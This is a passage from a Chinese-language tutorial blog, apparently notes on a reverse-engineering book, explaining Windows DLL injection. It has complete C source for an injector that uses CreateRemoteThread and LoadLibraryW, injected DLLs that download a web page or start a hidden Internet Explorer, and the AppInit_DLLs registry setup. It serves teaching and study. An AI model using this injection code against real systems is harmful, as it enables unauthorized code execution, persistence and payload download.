<li><code>CreateRemoteThread()</code> 调用 <code>LoadLibraryA/W</code></li>
</ol>
<p>案例中的myhack.dll</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_URL     	(<span class="string">L&quot;http://www.naver.com/index.html&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_FILE_NAME   (<span class="string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szPath[_MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">	</span><br><span class="line">    TCHAR *p = _tcsrchr( szPath, <span class="string">&#x27;\\&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span>( !p )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="comment">//下载指定网站的index.html</span></span><br><span class="line">    _tcscpy_s(p+<span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">    URLDownloadToFile(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : 	<span class="comment">//加载时</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>); <span class="comment">//输出调试字符串</span></span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//创建线程</span></span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在DllMain()函数中可以看到，该DLL被加载（DLL_PROCESS_ATTACH）时，先输出一个调试字符串（“myhack.dll Injection!!!”），然后创建线程调用函数（ThreadProc）。在ThreadProc()函数中通过调用urlmon!URLDownloadToFile() API来下载指定网站的index.html文件。前面提到过，向进程注入DLL后就会调用执行该DLL的DllMain()函数。所以当myhack.dll注入notepad.exe进程后，最终会调用执行URLDownloadToFile()API。</p>
</blockquote>
<p><strong>InjectDII.cpp</strong>InjectDll.exe程序用来将myhack.dll注入notepad.exe进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程.</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;        <span class="comment">//OpenProcess调用API，借助PID获取目标权限</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址.</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3. 将 myhack.dll 路径写入刚刚分配的缓冲区.</span></span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）.</span></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// #5. 在 notepad.exe 中运行线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>InjectDll()函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)</span><br></pre></td></tr></table></figure>

<p>调用OpenProcess API,借助程序运行时以参数形式传递过来的dwPID值，获取notepad.exe进程的句柄（PROCESS_ALL_ACCESS权限）。得到PROCESS_ALL_ACCESS权限后，就可以使用获取的句柄（hProcess ）控制对应进程</p>
<p>将要注入的DLL路径写入目标进程内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEMCOMMIT, PAGEREADWRITE);</span><br></pre></td></tr></table></figure>

<p>需要把即将加载的DLL文件的路径告知目标进程。因为任何内存空间都无法进行写入操作，故先使用VirtualAllocEx() API在目标进程的内存空间中分配一块缓冲区，且指定该缓冲区的大小为DLL文件路径字符串的长度（含Terminating NULL ）即可。</p>
<blockquote>
<p>VirtualAllocEx()函数的返回值（pRemoteBuf）为分配所得缓冲区的地址。该地址并不是程序（Inject.exe ）自身进程的内存地址，而是hProcess句柄所指目标进程（notepad.exe）的内存地址，请务必牢记这一点。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID) szDUName, dwBufSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>使用WriteProcessMemory() API将DLL路径字符串写入分配所得缓冲区（pRemoteBuf）地址。WriteProcessMemory API所写的内存空间也是hProcess句柄所指的目标进程的内存空间。</p>
<p>获取LoadLibraryW() API地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandle(<span class="string">&quot;kernel32 .dll&quot;</span>);</span><br><span class="line">pThreadProc = (LPTHREAD_STARTROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>调用LoadLibrary() API前先要获取其地址（LoadLibraryW()是LoadLibrary()的Unicode字符串版本）。</p>
<p>最重要的是理解好以上代码的含义。我们的目标明明是获取加载到notepad.exe进程的kernel32.dll的LoadLibraryW() API的起始地址，但上面的代码却用来获取加载到InjectDll.exe进程的kernel32.dll的LoadLibraryW() API的起始地址。如果加载到notepad.exe进程中的kemel32.dll的地址与加载到InjectDll.exe进程中的kemel32.dll的地址相同，那么上面的代码就不会有什么问题。但是如果kemel32.dll在每个进程中加载的地址都不同，那么上面的代码就错了，执行时会发生内存引用错误。</p>
<p><strong>其实在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的。</strong></p>
<p>《Windows核心编程》一书中对此进行了介绍，此后这一特性被广泛应用于DLL注入技术。</p>
<p>为什么要去获取LoadLibraryW() API的起始地址?不能直接写代码调用嘛</p>
<p>不是在当前进程执行代码，而是让目标进程执行代码</p>
<p>当调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(hProcess, ..., LoadLibraryW, pRemotePath, ...)</span><br></pre></td></tr></table></figure>

<p>在 <strong>notepad.exe</strong> 里面创建一个线程 让这个线程从 <code>LoadLibraryW</code> 地址开始执行</p>
<p>注意！这个线程是在,notepad.exe 的地址空间里执行而不是在,InjectDll.exe 的地址空间</p>
<p>LoadLibraryW(L”test.dll”);这只会发生在：InjectDll.exe 进程内部</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE                 hProcess,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="line"><span class="params">  SIZE_T                 dwStackSize,</span></span><br><span class="line"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  LPVOID                 lpParameter,</span></span><br><span class="line"><span class="params">  DWORD                  dwCreationFlags,</span></span><br><span class="line"><span class="params">  LPDWORD                lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>lpParameter：pRemoteBuf这个参数会作为：LoadLibraryW 的参数</p>
<p>除第一个参数hProcess外，其他参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程（或称远程进程、宿主进程）的句柄。IpStartAddress与IpParameter参数分别给出线程函数地址与线程参数地址。需要注意的是，这2个地址都应该在目标进程虚拟内存空间中。</p>
<blockquote>
<p>一般而言，DLL文件的ImageBase默认为0x10000000，依次加载a.dll与b.dll时，先加载的a.dll被正常加载到0x10000000地址处，后加载的b.dll无法再被加载到此，而是加载到其他空白地址空间，也就是说，该过程中发生了 DLL重定位（因为a.dll已经先被加载到它默认的地址处）。<br>若kemel32.dll加载到各个进程时地址各不相同，那么上述代码肯定是错误的。但实际在Windows操作系统中，kemel32.dll不管在哪个进程都会被加载至相同地址。为什么会这样呢？我借助PEView软件查看了 Windows操作系统的核心DLL文件的 ImageBase值，罗列如下表（Windows XP SP3版本，根据Windows更新不同，各值会有变化）。</p>
</blockquote>
<p>Windows 的做法是：</p>
<blockquote>
<p>给系统核心 DLL 预留固定地址 所有进程都映射到同一个虚拟地址， 这样就可以共享同一份物理内存页</p>
</blockquote>
<p><strong>kernel32.dll 是 Windows 提供基础系统功能的核心用户层 DLL。</strong></p>
<p>负责：进程管理 线程管理 内存管理 文件操作 控制台 同步机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CreateFile (kernel32)</span><br><span class="line">    ↓</span><br><span class="line">NtCreateFile (ntdll)</span><br><span class="line">    ↓</span><br><span class="line">系统调用</span><br><span class="line">    ↓</span><br><span class="line">ntoskrnl.exe</span><br></pre></td></tr></table></figure>

<p>在目标进程中运行远程线程（Remote Thread）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">pThreadProc = notepad.exe进程内存中的LoadLibrary()地址</span><br><span class="line">pRemoteBuf = notepad.exe进程内存中的 “c:\work\myhack.dll” 字符串地址</span><br></pre></td></tr></table></figure>

<p>一切准备就绪后，最后向notepad.exe发送一个命令，让其调用LoadLibraryW() API函数加载指定的DLL文件即可，遗憾的是Windows并未直接提供执行这一命令的API。但是我们可以另辟蹊径，使用CreateRemoteThread()这个API （在DLL注入时几乎总会用到）。</p>
<h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p>进行DLL注入的第二种方法是使用注册表，WindowsOS的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216154158784.png" alt="image-20260216154158784"></p>
<p>只要将要注入DLL的路径写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。</p>
<p>注：Windows XP会忽略LoadAppInit_DLLs注册表项。</p>
<blockquote>
<p><strong>User32.dll 是 Windows 提供图形界面和窗口管理的核心 DLL。</strong></p>
<p>负责：窗口 消息循环 键盘鼠标输入 对话框 按钮控件 消息机制</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myhack2.cpp</span></span><br><span class="line"><span class="comment">// 主要作用是以隐藏模式运行IE，连接到指定网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_CMD  <span class="string">L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_ADDR <span class="string">L&quot;http://www.naver.com&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DST_PROC <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szCmd[MAX_PATH]  = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        <span class="keyword">if</span>( !GetModuleFileName( <span class="literal">NULL</span>, szPath, MAX_PATH ) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( !(p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>)) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( _tcsicmp(p+<span class="number">1</span>, DEF_DST_PROC) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        wsprintf(szCmd, <span class="string">L&quot;%s %s&quot;</span>, DEF_CMD, DEF_ADDR);</span><br><span class="line">        <span class="keyword">if</span>( !CreateProcess(<span class="literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, </span><br><span class="line">                            NORMAL_PRIORITY_CLASS, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( pi.hProcess != <span class="literal">NULL</span> )</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>被注入的进程时64位，那么注入的DLL也应该是64位，32位对应32位。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs </span><br><span class="line"># 将下面注册表的键对应的值设置为 1</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs </span><br></pre></td></tr></table></figure>

<p>注入64位进程，应该修改的注册表键为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs</span><br><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为 1</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\LoadAppInit_DLLs</span><br></pre></td></tr></table></figure>

<h2 id="Windows消息钩取"><a href="#Windows消息钩取" class="headerlink" title="Windows消息钩取"></a>Windows消息钩取</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zer0o/p/17249259.html#%E8%B0%83%E8%AF%95main%E5%87%BD%E6%95%B0">DLL注入-Windows消息钩取 - Zer0o - 博客园</a></p>
<p>敲击键盘时，消息会从OS移动到应用程序，而<strong>消息钩子</strong>就是在这个过程中偷看信息</p>
<p><strong>常规Windows消息流：</strong></p>
<ol>
<li>发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]；</li>
